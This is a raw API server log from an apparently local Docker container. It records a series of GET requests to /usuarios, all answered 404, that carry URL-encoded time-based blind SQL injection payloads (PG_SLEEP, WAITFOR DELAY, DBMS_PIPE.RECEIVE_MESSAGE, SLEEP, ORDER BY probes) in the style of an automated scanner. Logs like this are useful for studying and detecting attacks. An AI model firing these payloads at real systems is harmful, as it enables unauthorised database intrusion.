api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:58676 - "GET /usuarios%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58678 - "GET /usuarios%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58680 - "GET /usuarios%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58682 - "GET /usuarios%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58692 - "GET /usuarios%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58708 - "GET /usuarios%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2873%29%7C%7CCHR%2880%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58714 - "GET /usuarios%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2873%29%7C%7CCHR%2880%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58720 - "GET /usuarios%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2873%29%7C%7CCHR%2880%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58724 - "GET /usuarios%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2873%29%7C%7CCHR%2880%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58728 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1112/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29tOUi%29/%2A%2A/AND/%2A%2A/%288485%3D8485 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58736 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1112/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29tOUi%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58746 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1112/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29tOUi%29/%2A%2A/AND/%2A%2A/%28%27VeuC%27%3D%27VeuC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58762 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1112/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29tOUi%29/%2A%2A/AND/%2A%2A/%27WHCi%27%3D%27WHCi HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58778 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1112/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29tOUi%29--/%2A%2A/misc HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58792 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/8014%3D%28SELECT/%2A%2A/8014/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%289085%3D9085 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58802 - "GET /usuarios/%2A%2A/AND/%2A%2A/8014%3D%28SELECT/%2A%2A/8014/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58804 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/8014%3D%28SELECT/%2A%2A/8014/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27wwsI%27%3D%27wwsI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58810 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/8014%3D%28SELECT/%2A%2A/8014/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27ASAa%27%3D%27ASAa HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58814 - "GET /usuarios/%2A%2A/AND/%2A%2A/8014%3D%28SELECT/%2A%2A/8014/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/FdBC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58818 - "GET /usuarios%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%282530%3D2530 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58824 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58832 - "GET /usuarios%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27pTkS%27%3D%27pTkS HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58844 - "GET /usuarios%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27ERqM%27%3D%27ERqM HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58858 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/jYWJ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58874 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/7605%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2888%29%7C%7CCHR%28101%29%2C5%29/%2A%2A/AND/%2A%2A/%283125%3D3125 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58884 - "GET /usuarios/%2A%2A/AND/%2A%2A/7605%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2888%29%7C%7CCHR%28101%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58900 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/7605%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2888%29%7C%7CCHR%28101%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27acdE%27%3D%27acdE HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58912 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/7605%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2888%29%7C%7CCHR%28101%29%2C5%29/%2A%2A/AND/%2A%2A/%27xoaY%27%3D%27xoaY HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58920 - "GET /usuarios/%2A%2A/AND/%2A%2A/7605%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2888%29%7C%7CCHR%28101%29%2C5%29--/%2A%2A/EWDN HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58936 - "GET /usuarios%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/shQU HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58956 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/BweB HTTP/1.1" 404 Not Found
